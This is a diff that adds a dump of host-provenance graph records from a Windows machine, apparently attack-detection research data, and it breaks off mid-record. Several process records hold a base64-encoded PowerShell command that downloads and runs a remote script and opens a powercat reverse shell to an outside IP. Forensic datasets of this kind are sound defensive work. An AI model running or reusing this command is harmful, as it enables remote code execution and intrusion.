@@ -1,0 +1,2453 @@
+MATCH (p:process)-[st:fileevent{optype:"write"}]->(f:file{name:"\\Device\\HarddiskVolume2\\ProgramData\\update.ps1"}) RETURN id(p) as srcid, id(f) as dstid, st.amount as amount, st.starttime as starttime, st.endtime as endtime;Vertex ID: 365686
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\ProgramData\\update.ps1
+Key: uuid, Value: 40989dd5-c389-4c76-8435-8b6074f19659
+startNode: 365686 edgeTime:1523300807164000000Vertex ID: 365665
+Key: exename, Value: powershell  -nop -ep bypass -encodedCommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADgALgA3ADUALgAxADEANwAuADUALwB1AHAAZABhAHQAZQAuAHAAcwAxACcALAAgACcAQwA6AFwAcAByAG8AZwByAGEAbQBkAGEAdABhAFwAdQBwAGQAYQB0AGUALgBwAHMAMQAnACkAOwAgAC4AIABDADoAXABcAHAAcgBvAGcAcgBhAG0AZABhAHQAYQBcAFwAdQBwAGQAYQB0AGUALgBwAHMAMQA7ACAAcABvAHcAZQByAGMAYQB0ACAALQBjACAAMgAwADgALgA3ADUALgAxADEANwAuADYAIAAtAHAAIAA4ADAAIAAtAGUAIABjAG0AZAAuAGUAeABl
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: pid, Value: 7784
+Key: uuid, Value: 9ED8A6DD-4421-49EF-952C-95345205919B
+Vertex ID: 365665
+Key: ownergroupid, Value:  
+Key: exename, Value: powershell  -nop -ep bypass -encodedCommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADgALgA3ADUALgAxADEANwAuADUALwB1AHAAZABhAHQAZQAuAHAAcwAxACcALAAgACcAQwA6AFwAcAByAG8AZwByAGEAbQBkAGEAdABhAFwAdQBwAGQAYQB0AGUALgBwAHMAMQAnACkAOwAgAC4AIABDADoAXABcAHAAcgBvAGcAcgBhAG0AZABhAHQAYQBcAFwAdQBwAGQAYQB0AGUALgBwAHMAMQA7ACAAcABvAHcAZQByAGMAYQB0ACAALQBjACAAMgAwADgALgA3ADUALgAxADEANwAuADYAIAAtAHAAIAA4ADAAIAAtAGUAIABjAG0AZAAuAGUAeABl
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: pid, Value: 7784
+Key: uuid, Value: 9ED8A6DD-4421-49EF-952C-95345205919B
+Vertex ID: 365685
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Users\\admin\\AppData\\Local\\Temp\\__PSScriptPolicyTest_2kczjlv4.vlp.ps1
+Key: uuid, Value: B49F3A43-0176-4030-8D06-A4D7EDC08BA2
+Vertex ID: 339136
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Users\\admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\ModuleAnalysisCache
+Key: uuid, Value: 5CD71BC9-DC96-4B7E-B8B7-A6608334D215
+Vertex ID: 338919
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Utility\\Microsoft.PowerShell.Utility.psd1
+Key: uuid, Value: 1F31476A-5242-40CF-95AA-F7B165E91DC9
+Vertex ID: 46167
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Microsoft.P521220ea#\\c2c1ce153341a9c8ac66880c03caa532\\Microsoft.PowerShell.Commands.Utility.ni.dll.aux
+Key: uuid, Value: 3FA9B26C-00F0-42D3-A20B-8FCF30959DE3
+Vertex ID: 46165
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Confe64a9051#\\9aba7ff42298fa6e1520ba2324076714\\System.Configuration.Install.ni.dll.aux
+Key: uuid, Value: 022A410E-F006-482A-8E11-66E8BFFAD850
+Vertex ID: 15245
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\0c9bec7e4e969db233900a4588c91656\\System.ni.dll
+Key: uuid, Value: C328F0FE-DCA9-4FF7-A8D5-B660B04E9750
+Vertex ID: 91236
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\rasman.dll
+Key: uuid, Value: 0B91BAC4-675E-4C0D-A780-71FC22B93F5A
+Vertex ID: 365686
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\ProgramData\\update.ps1
+Key: uuid, Value: 40989dd5-c389-4c76-8435-8b6074f19659
+Vertex ID: 365360
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe.config
+Key: uuid, Value: D508FB73-C05E-4355-8654-BA13BD7BD4D5
+Vertex ID: 45489
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\machine.config
+Key: uuid, Value: D725237D-8CA4-4876-913A-D51F9700C7B4
+Vertex ID: 45490
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\mscorlib\\8a9c7ab28dfd1baa08e20283667c4c7e\\mscorlib.ni.dll.aux
+Key: uuid, Value: 2297E9EF-6D0D-4A45-84A3-5B9919A1A685
+Vertex ID: 46166
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Microsoft.Pb378ec07#\\2e3884e193c877eb2cdcb8cb8b013c72\\Microsoft.PowerShell.ConsoleHost.ni.dll.aux
+Key: uuid, Value: 5833333A-8576-4954-ACB1-2BA2E07B2C8B
+Vertex ID: 45491
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\0c9bec7e4e969db233900a4588c91656\\System.ni.dll.aux
+Key: uuid, Value: 1297D5B9-7EC2-4369-A6FA-8166AC976809
+Vertex ID: 45493
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Core\\88dea3dcba1b28955a1a9346e1f346a2\\System.Core.ni.dll.aux
+Key: uuid, Value: 4D836764-5B89-4D45-911D-15FAD01B0847
+Vertex ID: 46037
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\c915ae5824457d3a69c36be12252eeff\\System.Management.Automation.ni.dll.aux
+Key: uuid, Value: 115F7A73-4625-47CA-B106-EEC7AE9E3807
+Vertex ID: 8237
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\clr.dll
+Key: uuid, Value: 34AAFA2D-EFAF-4840-88AE-3AACBFCEFEA9
+Vertex ID: 365687
+Key: srcip, Value: 128.55.12.67/32
+Key: hostname, Value: RiseLab
+Key: dstport, Value: 80
+Key: srcport, Value: 57619
+Key: dstip, Value: 208.75.117.5/32
+Key: uuid, Value: A2228FBE-118E-44C1-8D52-0A66D3CC12AC
+Vertex ID: 46400
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Microsoft.Mf49f6405#\\752c4b8efdfb6ebd5f1be8cedbb40d13\\Microsoft.Management.Infrastructure.ni.dll.aux
+Key: uuid, Value: 3C12915F-642B-4DA7-B5E5-A0F27AC4EBFB
+Vertex ID: 45494
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Management\\ace81fc29ee797953e01b4d1432bf7b9\\System.Management.ni.dll.aux
+Key: uuid, Value: 4A7B317E-7301-4D68-8199-73CBC9A09EF4
+Vertex ID: 46172
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Dired13b18a9#\\0477afcfdccc24502c8e79e7f6ce45c7\\System.DirectoryServices.ni.dll.aux
+Key: uuid, Value: 4B899FF0-2033-4A1B-950E-770DF55AA4AB
+Vertex ID: 46040
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Xml\\7260601a8e387f3dc0dec66fc8855067\\System.Xml.ni.dll.aux
+Key: uuid, Value: 7E7D1050-9A1A-4D66-986C-3EBAFF7B31A0
+Vertex ID: 46150
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Numerics\\f0215d4d9a67d23d8769d37aede1226f\\System.Numerics.ni.dll.aux
+Key: uuid, Value: 9300461F-A183-43FD-BA37-484ED4F50D4B
+Vertex ID: 46171
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Data\\ff8be0205712994dd25d2ee2a9610693\\System.Data.ni.dll.aux
+Key: uuid, Value: 3758DAC0-F8C3-458B-AF20-4AAD64ADDD90
+Vertex ID: 338920
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Utility\\Microsoft.PowerShell.Utility.psm1
+Key: uuid, Value: 1CB8C313-079C-417D-83A7-BC9D7AE0F248
+Vertex ID: 46169
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Microsoft.P6f792626#\\5e132857f6f38c1de39f5429f3691a04\\Microsoft.PowerShell.Security.ni.dll.aux
+Key: uuid, Value: 88816DDE-A563-406D-B4BD-8C3ECA6AC828
+Vertex ID: 46173
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Transactions\\5481c4ed3ac45c6df98b0c169f66cc57\\System.Transactions.ni.dll.aux
+Key: uuid, Value: 8799888A-B34E-4F7B-B359-5688D0257C87
+Vertex ID: 46039
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Configuration\\56f24a797ee3c2a1b9653c5eaa0a664c\\System.Configuration.ni.dll.aux
+Key: uuid, Value: F807A927-45E9-4F53-8A08-FE925930A1D3
+Vertex ID: 15254
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\mscorlib\\8a9c7ab28dfd1baa08e20283667c4c7e\\mscorlib.ni.dll
+Key: uuid, Value: 367CB473-B4C5-4524-94FB-306BB3E8A53B
+Vertex ID: 15263
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Core\\88dea3dcba1b28955a1a9346e1f346a2\\System.Core.ni.dll
+Key: uuid, Value: E952479D-0963-4FBC-A68C-6BF50CB65DDA
+Vertex ID: 365688
+Key: hostname, Value: RiseLab
+Key: srcip, Value: 128.55.12.67/32
+Key: dstport, Value: 80
+Key: srcport, Value: 57620
+Key: dstip, Value: 208.75.117.6/32
+Key: uuid, Value: 7AD06BC2-3D95-45B2-8DCC-51171B5DDBA0
+Vertex ID: 338922
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Management\\Microsoft.PowerShell.Management.psd1
+Key: uuid, Value: DFF9E527-98F6-4E97-8D8B-88EFFA752A39
+Vertex ID: 46168
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Microsoft.Pae3498d9#\\92829a11a674202dc6169d5db19b41ec\\Microsoft.PowerShell.Commands.Management.ni.dll.aux
+Key: uuid, Value: DD8B06FC-6030-4F52-ADC2-144F075FB9F5
+Vertex ID: 365665
+Key: ownergroupid, Value:  
+Key: exename, Value: powershell  -nop -ep bypass -encodedCommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADgALgA3ADUALgAxADEANwAuADUALwB1AHAAZABhAHQAZQAuAHAAcwAxACcALAAgACcAQwA6AFwAcAByAG8AZwByAGEAbQBkAGEAdABhAFwAdQBwAGQAYQB0AGUALgBwAHMAMQAnACkAOwAgAC4AIABDADoAXABcAHAAcgBvAGcAcgBhAG0AZABhAHQAYQBcAFwAdQBwAGQAYQB0AGUALgBwAHMAMQA7ACAAcABvAHcAZQByAGMAYQB0ACAALQBjACAAMgAwADgALgA3ADUALgAxADEANwAuADYAIAAtAHAAIAA4ADAAIAAtAGUAIABjAG0AZAAuAGUAeABl
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: pid, Value: 7784
+Key: uuid, Value: 9ED8A6DD-4421-49EF-952C-95345205919B
+Vertex ID: 365665
+Key: exename, Value: powershell  -nop -ep bypass -encodedCommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADgALgA3ADUALgAxADEANwAuADUALwB1AHAAZABhAHQAZQAuAHAAcwAxACcALAAgACcAQwA6AFwAcAByAG8AZwByAGEAbQBkAGEAdABhAFwAdQBwAGQAYQB0AGUALgBwAHMAMQAnACkAOwAgAC4AIABDADoAXABcAHAAcgBvAGcAcgBhAG0AZABhAHQAYQBcAFwAdQBwAGQAYQB0AGUALgBwAHMAMQA7ACAAcABvAHcAZQByAGMAYQB0ACAALQBjACAAMgAwADgALgA3ADUALgAxADEANwAuADYAIAAtAHAAIAA4ADAAIAAtAGUAIABjAG0AZAAuAGUAeABl
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: pid, Value: 7784
+Key: uuid, Value: 9ED8A6DD-4421-49EF-952C-95345205919B
+Vertex ID: 338810
+Key: exename, Value: C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\PowerShell_ISE.exe
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: pid, Value: 7616
+Key: uuid, Value: 31CC2540-3A0F-4588-842B-15296A6007AC
+Vertex ID: 338810
+Key: exename, Value: C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\PowerShell_ISE.exe
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: pid, Value: 7616
+Key: uuid, Value: 31CC2540-3A0F-4588-842B-15296A6007AC
+Vertex ID: 290673
+Key: exename, Value:  
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: C, Value: \\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\NGenTask.exe
+Key: owneruserid, Value:  
+Key: StopEvent, Value: 460
+Key: pid, Value: 7608
+Key: uuid, Value: E371E8B6-938E-4F62-B321-78725409D145
+Vertex ID: 290673
+Key: exename, Value:  
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: C, Value: \\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\NGenTask.exe
+Key: owneruserid, Value:  
+Key: StopEvent, Value: 460
+Key: pid, Value: 7608
+Key: uuid, Value: E371E8B6-938E-4F62-B321-78725409D145
+Vertex ID: 290673
+Key: exename, Value:  
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: C, Value: \\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\NGenTask.exe
+Key: owneruserid, Value:  
+Key: StopEvent, Value: 460
+Key: pid, Value: 7608
+Key: uuid, Value: E371E8B6-938E-4F62-B321-78725409D145
+Vertex ID: 290673
+Key: ownergroupid, Value:  
+Key: exename, Value:  
+Key: hostname, Value: RiseLab
+Key: C, Value: \\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\NGenTask.exe
+Key: owneruserid, Value:  
+Key: StopEvent, Value: 460
+Key: pid, Value: 7608
+Key: uuid, Value: E371E8B6-938E-4F62-B321-78725409D145
+Vertex ID: 290673
+Key: exename, Value:  
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: C, Value: \\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\NGenTask.exe
+Key: owneruserid, Value:  
+Key: StopEvent, Value: 460
+Key: pid, Value: 7608
+Key: uuid, Value: E371E8B6-938E-4F62-B321-78725409D145
+Vertex ID: 290673
+Key: exename, Value:  
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: C, Value: \\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\NGenTask.exe
+Key: owneruserid, Value:  
+Key: StopEvent, Value: 460
+Key: pid, Value: 7608
+Key: uuid, Value: E371E8B6-938E-4F62-B321-78725409D145
+Vertex ID: 365665
+Key: exename, Value: powershell  -nop -ep bypass -encodedCommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADgALgA3ADUALgAxADEANwAuADUALwB1AHAAZABhAHQAZQAuAHAAcwAxACcALAAgACcAQwA6AFwAcAByAG8AZwByAGEAbQBkAGEAdABhAFwAdQBwAGQAYQB0AGUALgBwAHMAMQAnACkAOwAgAC4AIABDADoAXABcAHAAcgBvAGcAcgBhAG0AZABhAHQAYQBcAFwAdQBwAGQAYQB0AGUALgBwAHMAMQA7ACAAcABvAHcAZQByAGMAYQB0ACAALQBjACAAMgAwADgALgA3ADUALgAxADEANwAuADYAIAAtAHAAIAA4ADAAIAAtAGUAIABjAG0AZAAuAGUAeABl
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: pid, Value: 7784
+Key: uuid, Value: 9ED8A6DD-4421-49EF-952C-95345205919B
+Vertex ID: 365665
+Key: ownergroupid, Value:  
+Key: exename, Value: powershell  -nop -ep bypass -encodedCommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADgALgA3ADUALgAxADEANwAuADUALwB1AHAAZABhAHQAZQAuAHAAcwAxACcALAAgACcAQwA6AFwAcAByAG8AZwByAGEAbQBkAGEAdABhAFwAdQBwAGQAYQB0AGUALgBwAHMAMQAnACkAOwAgAC4AIABDADoAXABcAHAAcgBvAGcAcgBhAG0AZABhAHQAYQBcAFwAdQBwAGQAYQB0AGUALgBwAHMAMQA7ACAAcABvAHcAZQByAGMAYQB0ACAALQBjACAAMgAwADgALgA3ADUALgAxADEANwAuADYAIAAtAHAAIAA4ADAAIAAtAGUAIABjAG0AZAAuAGUAeABl
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: pid, Value: 7784
+Key: uuid, Value: 9ED8A6DD-4421-49EF-952C-95345205919B
+Vertex ID: 290673
+Key: ownergroupid, Value:  
+Key: exename, Value:  
+Key: hostname, Value: RiseLab
+Key: C, Value: \\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\NGenTask.exe
+Key: owneruserid, Value:  
+Key: StopEvent, Value: 460
+Key: pid, Value: 7608
+Key: uuid, Value: E371E8B6-938E-4F62-B321-78725409D145
+Vertex ID: 290673
+Key: ownergroupid, Value:  
+Key: exename, Value:  
+Key: hostname, Value: RiseLab
+Key: C, Value: \\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\NGenTask.exe
+Key: owneruserid, Value:  
+Key: StopEvent, Value: 460
+Key: pid, Value: 7608
+Key: uuid, Value: E371E8B6-938E-4F62-B321-78725409D145
+Vertex ID: 290673
+Key: exename, Value:  
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: C, Value: \\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\NGenTask.exe
+Key: owneruserid, Value:  
+Key: StopEvent, Value: 460
+Key: pid, Value: 7608
+Key: uuid, Value: E371E8B6-938E-4F62-B321-78725409D145
+Vertex ID: 290673
+Key: ownergroupid, Value:  
+Key: exename, Value:  
+Key: hostname, Value: RiseLab
+Key: C, Value: \\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\NGenTask.exe
+Key: owneruserid, Value:  
+Key: StopEvent, Value: 460
+Key: pid, Value: 7608
+Key: uuid, Value: E371E8B6-938E-4F62-B321-78725409D145
+Vertex ID: 290673
+Key: ownergroupid, Value:  
+Key: exename, Value:  
+Key: hostname, Value: RiseLab
+Key: C, Value: \\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\NGenTask.exe
+Key: owneruserid, Value:  
+Key: StopEvent, Value: 460
+Key: pid, Value: 7608
+Key: uuid, Value: E371E8B6-938E-4F62-B321-78725409D145
+Vertex ID: 290673
+Key: ownergroupid, Value:  
+Key: exename, Value:  
+Key: hostname, Value: RiseLab
+Key: C, Value: \\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\NGenTask.exe
+Key: owneruserid, Value:  
+Key: StopEvent, Value: 460
+Key: pid, Value: 7608
+Key: uuid, Value: E371E8B6-938E-4F62-B321-78725409D145
+Vertex ID: 290673
+Key: ownergroupid, Value:  
+Key: exename, Value:  
+Key: hostname, Value: RiseLab
+Key: C, Value: \\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\NGenTask.exe
+Key: owneruserid, Value:  
+Key: StopEvent, Value: 460
+Key: pid, Value: 7608
+Key: uuid, Value: E371E8B6-938E-4F62-B321-78725409D145
+Vertex ID: 290673
+Key: ownergroupid, Value:  
+Key: exename, Value:  
+Key: hostname, Value: RiseLab
+Key: C, Value: \\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\NGenTask.exe
+Key: owneruserid, Value:  
+Key: StopEvent, Value: 460
+Key: pid, Value: 7608
+Key: uuid, Value: E371E8B6-938E-4F62-B321-78725409D145
+Vertex ID: 365665
+Key: exename, Value: powershell  -nop -ep bypass -encodedCommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADgALgA3ADUALgAxADEANwAuADUALwB1AHAAZABhAHQAZQAuAHAAcwAxACcALAAgACcAQwA6AFwAcAByAG8AZwByAGEAbQBkAGEAdABhAFwAdQBwAGQAYQB0AGUALgBwAHMAMQAnACkAOwAgAC4AIABDADoAXABcAHAAcgBvAGcAcgBhAG0AZABhAHQAYQBcAFwAdQBwAGQAYQB0AGUALgBwAHMAMQA7ACAAcABvAHcAZQByAGMAYQB0ACAALQBjACAAMgAwADgALgA3ADUALgAxADEANwAuADYAIAAtAHAAIAA4ADAAIAAtAGUAIABjAG0AZAAuAGUAeABl
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: pid, Value: 7784
+Key: uuid, Value: 9ED8A6DD-4421-49EF-952C-95345205919B
+Vertex ID: 365665
+Key: exename, Value: powershell  -nop -ep bypass -encodedCommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADgALgA3ADUALgAxADEANwAuADUALwB1AHAAZABhAHQAZQAuAHAAcwAxACcALAAgACcAQwA6AFwAcAByAG8AZwByAGEAbQBkAGEAdABhAFwAdQBwAGQAYQB0AGUALgBwAHMAMQAnACkAOwAgAC4AIABDADoAXABcAHAAcgBvAGcAcgBhAG0AZABhAHQAYQBcAFwAdQBwAGQAYQB0AGUALgBwAHMAMQA7ACAAcABvAHcAZQByAGMAYQB0ACAALQBjACAAMgAwADgALgA3ADUALgAxADEANwAuADYAIAAtAHAAIAA4ADAAIAAtAGUAIABjAG0AZAAuAGUAeABl
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: pid, Value: 7784
+Key: uuid, Value: 9ED8A6DD-4421-49EF-952C-95345205919B
+Vertex ID: 290673
+Key: ownergroupid, Value:  
+Key: exename, Value:  
+Key: hostname, Value: RiseLab
+Key: C, Value: \\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\NGenTask.exe
+Key: owneruserid, Value:  
+Key: StopEvent, Value: 460
+Key: pid, Value: 7608
+Key: uuid, Value: E371E8B6-938E-4F62-B321-78725409D145
+Vertex ID: 8239
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscoreei.dll
+Key: uuid, Value: 94E43019-3CE9-47C5-9F55-6A58475C1CF8
+Vertex ID: 338818
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell_ise.exe.config
+Key: uuid, Value: FDBCF315-162C-429A-8BA8-47BB0B020A30
+Vertex ID: 45489
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\machine.config
+Key: uuid, Value: D725237D-8CA4-4876-913A-D51F9700C7B4
+Vertex ID: 45490
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\mscorlib\\8a9c7ab28dfd1baa08e20283667c4c7e\\mscorlib.ni.dll.aux
+Key: uuid, Value: 2297E9EF-6D0D-4A45-84A3-5B9919A1A685
+Vertex ID: 338817
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell_ise.exe
+Key: uuid, Value: 712DA4A5-84DE-4C14-9F5D-B7E030642F0D
+Vertex ID: 46706
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
